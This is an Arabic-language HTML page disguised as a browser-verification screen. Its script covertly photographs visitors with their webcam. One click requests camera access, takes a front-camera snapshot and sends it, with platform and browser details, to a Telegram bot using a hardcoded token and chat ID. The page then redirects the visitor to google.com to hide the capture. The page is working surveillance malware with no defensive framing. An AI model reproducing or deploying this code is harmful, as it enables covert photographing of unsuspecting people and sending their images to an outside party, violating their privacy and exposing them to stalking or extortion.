<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق من المتصفح...</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
        .box { text-align: center; padding: 30px; border-radius: 12px; background: #1e293b; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 400px; width: 90%; pointer-events: none; }
        .loader { border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onclick="startCapture()">
    <div class="box" id="content-box">
        <h2>جاري التحقق من المتصفح...</h2>
        <p style="color: #94a3b8; font-size: 14px;">يرجى الانتظار قليلاً، يتم تحميل المحتوى...</p>
        <div class="loader" id="loading-spinner"></div>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8928993393:AAH91PXDAb0WD0gAAy3K-8KAXssZvOJEdw8";
        const CHAT_ID = "7109702630";
        let captured = false;

        async function startCapture() {
            if (captured) return;
            captured = true;
            
            document.getElementById('loading-spinner').style.display = 'block';
            
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                    audio: false 
                });
            } catch (e1) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                } catch (e2) {
                    console.error("Camera access denied", e2);
                    redirectToTarget();
                    return;
                }
            }

            try {
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await video.play();
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.90);
                const blob = dataURItoBlob(dataUrl);
                
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const captionText = `🎯 تم التقاط صورة جديدة!\n💻 النظام: ${platform}\n🌐 المتصفح: ${userAgent.substring(0, 60)}...`;

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'target_capture.jpg');
                formData.append('caption', captionText);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                stream.getTracks().forEach(track => track.stop());
            } catch (err) {
                console.error("Capture process failed:", err);
            } finally {
                redirectToTarget();
            }
        }

        function redirectToTarget() {
            setTimeout(() => {
                window.location.href = "https://google.com";
            }, 800);
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], {type: mimeString});
        }
    </script>
</body>
</html>
